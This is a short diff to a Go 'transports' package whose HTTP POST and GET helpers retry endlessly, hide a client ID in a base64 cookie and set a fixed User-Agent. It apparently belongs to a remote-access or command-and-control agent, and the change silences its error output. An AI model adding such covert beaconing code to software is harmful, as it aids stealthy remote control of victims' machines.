@@ -3,7 +3,7 @@ package transports
 import (
 	"crypto/tls"
 	"encoding/base64"
-	"fmt"
+	// "fmt"
 	"net"
 	"net/http"
 	"net/url"
@@ -52,12 +52,16 @@ func init() {
 func HttpPost(url string, clientID string, data []byte) *http.Response {
 	for {
 		webreq, err := http.NewRequest("POST", url, strings.NewReader(base64.URLEncoding.EncodeToString([]byte(data))))
+		if err != nil {
+			time.Sleep(constants.SleepTime)
+			continue
+		}
 		webreq.Header.Set("User-Agent", constants.UserAgent)
 		webreq.Header.Set("Cookie", base64.RawURLEncoding.EncodeToString([]byte(clientID)))
 		resp, err := Client.Do(webreq)
 
 		if err != nil {
-			fmt.Printf("!error: %v\n", err)
+			// fmt.Printf("!error: %v\n", err)
 			time.Sleep(constants.SleepTime)
 			continue
 		} else {
@@ -74,12 +78,16 @@ func HttpPost(url string, clientID string, data []byte) *http.Response {
 func HttpGet(url string, cookies string) *http.Response {
 	for {
 		webreq, err := http.NewRequest("GET", url, nil)
+		if err != nil {
+			time.Sleep(constants.SleepTime)
+			continue
+		}
 		webreq.Header.Set("User-Agent", constants.UserAgent)
 		webreq.Header.Set("Cookie", cookies)
 		resp, err := Client.Do(webreq)
 
 		if err != nil {
-			fmt.Printf("!error: %v\n", err)
+			// fmt.Printf("!error: %v\n", err)
 			time.Sleep(constants.SleepTime)
 			continue
 		} else {
